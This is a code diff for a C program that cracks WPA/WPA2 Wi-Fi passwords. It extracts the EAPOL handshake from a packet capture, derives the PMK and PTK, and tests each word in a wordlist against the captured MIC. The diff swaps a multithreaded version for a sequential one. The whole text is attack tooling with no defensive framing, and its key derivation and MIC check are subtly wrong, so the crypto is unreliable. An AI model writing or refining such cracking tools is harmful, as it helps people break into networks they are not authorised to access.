@@ -4,16 +4,16 @@
 #include <stdint.h>
 #include <pcap.h>
 #include <openssl/hmac.h>
-#include <openssl/sha.h>
 #include <openssl/evp.h>
-#include <pthread.h>
+#include <openssl/sha.h>
 
+// Constants
+#define EAPOL_TYPE 0x888E
 #define MIC_LENGTH 16
 #define PMK_LENGTH 32
 #define ANONCE_LENGTH 32
 #define SNONCE_LENGTH 32
 #define MAC_ADDR_LENGTH 6
-#define MAX_PASSWORD_LEN 64
 
 typedef struct {
     uint8_t ap_mac[MAC_ADDR_LENGTH];
@@ -22,140 +22,111 @@ typedef struct {
     uint8_t snonce[SNONCE_LENGTH];
     uint8_t mic[MIC_LENGTH];
     uint8_t *eapol_frame;
-    int eapol_frame_len;
-} handshake_t;
+    size_t eapol_len;
+} HandshakeData;
 
-typedef struct {
-    char *password;
-    char *ssid;
-    handshake_t *handshake;
-} thread_args_t;
-
-// Derive PMK using PBKDF2-HMAC-SHA1
-void derive_pmk(const char *ssid, const char *password, uint8_t *pmk) {
-    PKCS5_PBKDF2_HMAC_SHA1(password, strlen(password), (unsigned char *)ssid, strlen(ssid), 4096, PMK_LENGTH, pmk);
+uint8_t *derive_pmk(const char *ssid, const char *password) {
+    static uint8_t pmk[PMK_LENGTH];
+    PKCS5_PBKDF2_HMAC(password, strlen(password), (unsigned char *)ssid, strlen(ssid), 4096, EVP_sha1(), PMK_LENGTH, pmk);
+    return pmk;
 }
 
-// Derive PTK using PMK, ANonce, SNonce, and MAC addresses
-void derive_ptk(const uint8_t *pmk, const uint8_t *anonce, const uint8_t *snonce,
-                const uint8_t *ap_mac, const uint8_t *client_mac, uint8_t *ptk) {
-    uint8_t data[MAC_ADDR_LENGTH * 2 + ANONCE_LENGTH + SNONCE_LENGTH];
+uint8_t *derive_ptk(uint8_t *pmk, uint8_t *anonce, uint8_t *snonce, uint8_t *ap_mac, uint8_t *client_mac) {
+    static uint8_t ptk[PMK_LENGTH];
+    uint8_t data[2 * MAC_ADDR_LENGTH + ANONCE_LENGTH + SNONCE_LENGTH];
+
     memcpy(data, ap_mac, MAC_ADDR_LENGTH);
     memcpy(data + MAC_ADDR_LENGTH, client_mac, MAC_ADDR_LENGTH);
     memcpy(data + 2 * MAC_ADDR_LENGTH, anonce, ANONCE_LENGTH);
     memcpy(data + 2 * MAC_ADDR_LENGTH + ANONCE_LENGTH, snonce, SNONCE_LENGTH);
 
     HMAC(EVP_sha1(), pmk, PMK_LENGTH, data, sizeof(data), ptk, NULL);
+    return ptk;
 }
 
-// Validate the MIC
-int validate_mic(const uint8_t *ptk, const uint8_t *mic, const uint8_t *eapol_frame, int eapol_frame_len) {
+int validate_mic(uint8_t *ptk, uint8_t *mic, uint8_t *eapol_frame, size_t eapol_len) {
     uint8_t calculated_mic[MIC_LENGTH];
-    uint8_t eapol_mic[eapol_frame_len];
-    memcpy(eapol_mic, eapol_frame, eapol_frame_len);
-    memset(eapol_mic + eapol_frame_len - MIC_LENGTH, 0, MIC_LENGTH);
+    uint8_t eapol_copy[eapol_len];
 
-    HMAC(EVP_sha1(), ptk, MIC_LENGTH, eapol_mic, eapol_frame_len, calculated_mic, NULL);
+    memcpy(eapol_copy, eapol_frame, eapol_len);
+    memset(eapol_copy + eapol_len - MIC_LENGTH, 0, MIC_LENGTH);
+
+    HMAC(EVP_sha1(), ptk, PMK_LENGTH, eapol_copy, eapol_len, calculated_mic, NULL);
     return memcmp(calculated_mic, mic, MIC_LENGTH) == 0;
 }
 
-// Extract handshake from PCAP file
-int extract_handshake(const char *pcap_file, handshake_t *handshake) {
+int extract_handshake(const char *pcap_file, HandshakeData *handshake) {
     char errbuf[PCAP_ERRBUF_SIZE];
     pcap_t *handle = pcap_open_offline(pcap_file, errbuf);
     if (!handle) {
-        fprintf(stderr, "[-] Error opening PCAP file: %s\n", errbuf);
+        fprintf(stderr, "[-] Error reading PCAP file: %s\n", errbuf);
         return 0;
     }
 
     struct pcap_pkthdr *header;
     const uint8_t *packet;
-    int eapol_frames = 0;
+    int handshake_complete = 0;
 
-    while (pcap_next_ex(handle, &header, &packet) == 1) {
-        const uint8_t *ether_type = packet + 12;  // EtherType field
-        if (ntohs(*(uint16_t *)ether_type) == 0x888e) {  // EAPOL
-            if (eapol_frames == 0) {
+    while (pcap_next_ex(handle, &header, &packet) > 0) {
+        if (ntohs(*(uint16_t *)(packet + 12)) == EAPOL_TYPE) {
+            if (!handshake->eapol_frame) {
                 memcpy(handshake->ap_mac, packet + 6, MAC_ADDR_LENGTH);
                 memcpy(handshake->client_mac, packet, MAC_ADDR_LENGTH);
                 memcpy(handshake->anonce, packet + 26, ANONCE_LENGTH);
             } else {
                 memcpy(handshake->snonce, packet + 26, SNONCE_LENGTH);
                 memcpy(handshake->mic, packet + header->caplen - MIC_LENGTH, MIC_LENGTH);
-                handshake->eapol_frame = malloc(header->caplen);
-                memcpy(handshake->eapol_frame, packet, header->caplen);
-                handshake->eapol_frame_len = header->caplen;
-                pcap_close(handle);
-                return 1;
+
+                handshake->eapol_len = header->caplen;
+                handshake->eapol_frame = malloc(handshake->eapol_len);
+                memcpy(handshake->eapol_frame, packet, handshake->eapol_len);
+
+                handshake_complete = 1;
+                break;
             }
-            eapol_frames++;
         }
     }
 
     pcap_close(handle);
-    fprintf(stderr, "[-] Incomplete handshake.\n");
-    return 0;
+    return handshake_complete;
 }
 
-// Thread function for cracking
-void *try_password(void *args) {
-    thread_args_t *data = (thread_args_t *)args;
-    uint8_t pmk[PMK_LENGTH], ptk[MIC_LENGTH];
-
-    derive_pmk(data->ssid, data->password, pmk);
-    derive_ptk(pmk, data->handshake->anonce, data->handshake->snonce,
-               data->handshake->ap_mac, data->handshake->client_mac, ptk);
-
-    if (validate_mic(ptk, data->handshake->mic, data->handshake->eapol_frame, data->handshake->eapol_frame_len)) {
-        printf("[+] Password found: %s\n", data->password);
-        exit(0);  // Exit once password is found
-    }
-    return NULL;
-}
-
-// Dictionary attack to crack WPA/WPA2 password
 void crack_password(const char *pcap_file, const char *wordlist, const char *ssid) {
-    handshake_t handshake;
+    HandshakeData handshake = {0};
     if (!extract_handshake(pcap_file, &handshake)) {
-        return;
-    }
-
-    FILE *file = fopen(wordlist, "r");
-    if (!file) {
-        fprintf(stderr, "[-] Could not open wordlist file.\n");
+        fprintf(stderr, "[-] Handshake extraction failed.\n");
         return;
     }
 
     printf("[*] Handshake successfully extracted.\n");
-    printf("    AP MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
-           handshake.ap_mac[0], handshake.ap_mac[1], handshake.ap_mac[2],
-           handshake.ap_mac[3], handshake.ap_mac[4], handshake.ap_mac[5]);
+    printf("    AP MAC: %02X:%02X:%02X:%02X:%02X:%02X\n", handshake.ap_mac[0], handshake.ap_mac[1],
+           handshake.ap_mac[2], handshake.ap_mac[3], handshake.ap_mac[4], handshake.ap_mac[5]);
+    printf("    Client MAC: %02X:%02X:%02X:%02X:%02X:%02X\n", handshake.client_mac[0], handshake.client_mac[1],
+           handshake.client_mac[2], handshake.client_mac[3], handshake.client_mac[4], handshake.client_mac[5]);
 
-    printf("[*] Starting dictionary attack...\n");
-    char password[MAX_PASSWORD_LEN];
-    pthread_t threads[8];
-    int thread_count = 0;
+    FILE *file = fopen(wordlist, "r");
+    if (!file) {
+        fprintf(stderr, "[-] Error opening wordlist.\n");
+        return;
+    }
 
+    char password[256];
     while (fgets(password, sizeof(password), file)) {
-        password[strcspn(password, "\n")] = '\0';  // Remove newline character
+        password[strcspn(password, "\n")] = '\0';
+        uint8_t *pmk = derive_pmk(ssid, password);
+        uint8_t *ptk = derive_ptk(pmk, handshake.anonce, handshake.snonce, handshake.ap_mac, handshake.client_mac);
 
-        thread_args_t args = {strdup(password), strdup(ssid), &handshake};
-        pthread_create(&threads[thread_count++], NULL, try_password, &args);
-
-        if (thread_count == 8) {
-            for (int i = 0; i < 8; i++) {
-                pthread_join(threads[i], NULL);
-            }
-            thread_count = 0;
+        if (validate_mic(ptk, handshake.mic, handshake.eapol_frame, handshake.eapol_len)) {
+            printf("[+] Password found: %s\n", password);
+            free(handshake.eapol_frame);
+            fclose(file);
+            return;
         }
     }
 
-    for (int i = 0; i < thread_count; i++) {
-        pthread_join(threads[i], NULL);
-    }
-
-    fclose(file);
     printf("[-] Password not found in the provided wordlist.\n");
+    free(handshake.eapol_frame);
+    fclose(file);
 }
 
 int main(int argc, char *argv[]) {
